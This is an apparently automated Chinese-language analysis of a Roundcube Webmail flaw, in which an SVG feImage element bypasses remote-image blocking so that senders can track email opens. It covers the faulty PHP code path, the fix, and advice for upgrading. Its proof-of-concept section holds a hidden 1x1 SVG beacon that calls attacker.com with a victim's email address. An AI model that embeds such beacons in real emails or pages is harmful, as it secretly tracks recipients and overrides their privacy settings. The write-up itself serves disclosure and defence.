---
story_id: 46937012
hn_url: https://news.ycombinator.com/item?id=46937012
title: "Roundcube Webmail: SVG feImage bypasses image blocking to track email opens"
verdict: technical
created_at: 2026-02-09T10:52:45
---

# Roundcube Webmail SVG feImage 远程图片加载绕过漏洞

## 漏洞概述

**漏洞编号**：无 CVE（截至发布日期）

**影响版本**：
- Roundcube Webmail < 1.5.13
- Roundcube Webmail 1.6.x < 1.6.13

**修复版本**：1.5.13、1.6.13

**披露日期**：2026-02-08

**漏洞类型**：隐私绕过、邮件追踪

## 技术细节

### 核心问题

Roundcube Webmail 的 HTML 清理器 `rcube_washtml` 在阻止外部资源时存在遗漏。当用户开启"阻止远程图片"功能时，系统会拦截 `<img>`、`<image>` 和 `<use>` 标签的外部资源，但 **`<feImage>` SVG 滤镜元素** 的 `href` 属性未被正确处理。

### 漏洞机制

1. **代码路径错误**：`<feImage>` 的 `href` 属性被发送到 `wash_link()` 函数（用于处理普通链接），而非 `wash_uri()` 函数（用于阻止外部图片）
2. **匹配逻辑缺陷**：`is_image_attribute()` 只检查了 `use` 和 `image` 标签的 `href`，遗漏了 `feimage`
3. **通用捕获问题**：`is_link_attribute()` 是一个通用的捕获器，匹配所有元素的 `href` 属性，包括 `<feImage>`

### 受影响的代码路径

```php
// 修复前的代码逻辑
if ($this->is_image_attribute($node->nodeName, $key)) {
    $out = $this->wash_uri($value, true); // 阻止远程 URL
} elseif ($this->is_link_attribute($node->nodeName, $attr)) {
    $out = $this->wash_link($value); // 允许 http/https - 问题所在
}
```

### 概念验证

攻击者可以通过以下方式绕过图片阻止：

```html
<svg width="1" height="1" style="position:absolute;left:-9999px;">
  <defs>
    <filter id="t">
      <feImage href="https://attacker.com/track?email=victim@test.com" 
               width="1" height="1"/>
    </filter>
  </defs>
  <rect filter="url(#t)" width="1" height="1"/>
</svg>
```

浏览器在渲染 SVG 滤镜时会自动触发对攻击者 URL 的 GET 请求。

### 修复方案

修复（commit 26d7677）将 `use` 和 `image` 的单独检查合并为包含 `feimage` 的正则表达式：

```php
|| ($attr == 'href' && preg_match('/^(feimage|image|use)$/i', $tag)); // SVG
```

## 影响评估

### 安全影响

1. **邮件追踪绕过**：攻击者可以在用户开启"阻止远程图片"的情况下追踪邮件打开状态
2. **信息泄露**：可记录受害者 IP 地址、浏览器指纹等信息
3. **用户隐私**：用户的隐私设置被完全绕过

### 实际威胁

- **广泛使用**：Roundcube 是流行的开源 Webmail 解决方案
- **隐蔽性强**：使用 1x1 像素的 SVG，位置在屏幕外，用户不可见
- **难以检测**：外部 URL 通过合法的 SVG 功能加载

## 社区讨论要点

### 防御策略讨论

1. **预取策略**：有用户建议邮件客户端在接收邮件时预取所有图片并缓存 72 小时，使"打开"标记失去意义
2. **SMTP 拒绝**：建议对已知垃圾邮件立即返回 SMTP 550 错误，不提供任何信号
3. **黑名单 vs 白名单**：社区指出基于黑名单的 HTML 清理注定失败，应采用白名单策略

### 相关安全问题

1. **Gmail 预取漏洞**：Gmail 的预取功能会遵守 HTTP 缓存头，追踪公司可使用 `no-cache, must-revalidate` 绕过
2. **SVG 作为攻击载体**：SVG 被认为是强大的攻击向量，几乎所有允许 SVG 上传的 Web 应用都存在 XSS 风险
3. **srcset 遗漏**：有专家指出 Roundcube 还遗漏了 `srcset` 属性的处理

### 法律和隐私问题

- **GDPR 合规性**：有用户质疑此类追踪是否符合 GDPR 规定
- **监管现状**：大多数用户不希望让每封邮件追踪器知道其阅读状态，导致监控军备竞赛

## 时间线

| 日期 | 事件 |
|------|------|
| 2026-01-04 | 向 Roundcube 报告漏洞 |
| 2026-02-08 | 发布 1.5.13 和 1.6.13 版本 |
| 2026-02-08 | 公开披露 |

## 经验教训

1. **HTML 清理的复杂性**：SVG 规范庞大，大多数清理器只处理常见元素，容易遗漏
2. **白名单的重要性**：手工维护的白名单容易出现遗漏，未知的元素-属性组合应默认移除
3. **命名空间的考虑**：需要特别注意 SVG、MathML 等不同命名空间的元素
4. **递归资源加载**：SVG 可以引用外部资源，需要递归检查所有可能的外部引用

## 建议

### 对于管理员

- 立即升级到 Roundcube 1.5.13 或 1.6.13
- 考虑在邮件网关层面阻止 SVG 附件
- 监控异常的邮件模式

### 对于开发者

- 审查所有 HTML 清理逻辑，特别是 SVG 相关元素
- 采用白名单而非黑名单策略
- 考虑完全禁用复杂的 SVG 功能或使用沙箱渲染

### 对于用户

- 保持 Roundcube 更新到最新版本
- 注意即使开启图片阻止，也可能存在其他追踪向量
- 考虑使用浏览器扩展增强隐私保护

## 相关资源

- [漏洞披露文章](https://nullcathedral.com/posts/2026-02-08-roundcube-svg-feimage-remote-image-bypass/)
- [Roundcube 官方网站](https://roundcube.net/)
- [修复 commit 26d7677](https://github.com/roundcube/roundcubemail/commit/26d7677)

---

**分析日期**：2026-02-09  
**分析人员**：Security Analysis Bot  
**风险等级**：中等（需要立即更新但已有修复方案）